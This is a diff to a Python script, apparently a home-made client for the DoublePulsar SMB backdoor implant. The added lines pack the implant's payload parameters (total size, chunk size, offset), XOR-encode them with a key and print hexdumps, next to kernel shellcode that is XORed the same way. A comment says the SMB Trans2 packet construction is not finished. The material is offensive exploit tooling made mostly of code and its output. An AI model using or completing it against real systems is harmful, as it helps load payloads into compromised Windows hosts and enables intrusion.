@@ -255,6 +255,30 @@ if __name__ == "__main__":
         byte_xor(modified_kernel_shellcode, packed_xor_key)
         print(hexdump(modified_kernel_shellcode))
         
+        print("Generating the Doublepulsar parameters...")
+        parameters = b''
+        EntireSize = struct.pack('<I', 4096) #Total Size of the payload here
+        ChunkSize = struct.pack('<I', 4096)  #size of the chunk
+        offset = struct.pack('<I', 0)        #offset of the payload
+        parameters += EntireSize
+        parameters += ChunkSize
+        parameters += offset
+        print(parameters)
+        print(hexdump(parameters))
+        '''
+        b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00'
+        ['00000000  00 10 00 00 00 10 00 00  00 00 00 00             |............    |']
+        '''
+
+        parameters_bytearray = bytearray(parameters)
+        str_xor(parameters_bytearray, array_xor_key)
+        print(parameters_bytearray)
+        print(hexdump(parameters_bytearray))
+        '''
+        bytearray(b'b\x01XXb\x01XXb\x11XX')
+        ['00000000  62 01 58 58 62 01 58 58  62 11 58 58             |b.XXb.XXb.XX    |']
+        '''
+        
         # fill up the SMB Trans2 Secondary packet structures
         # CODE IS NOT FINISHED HERE
         # helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
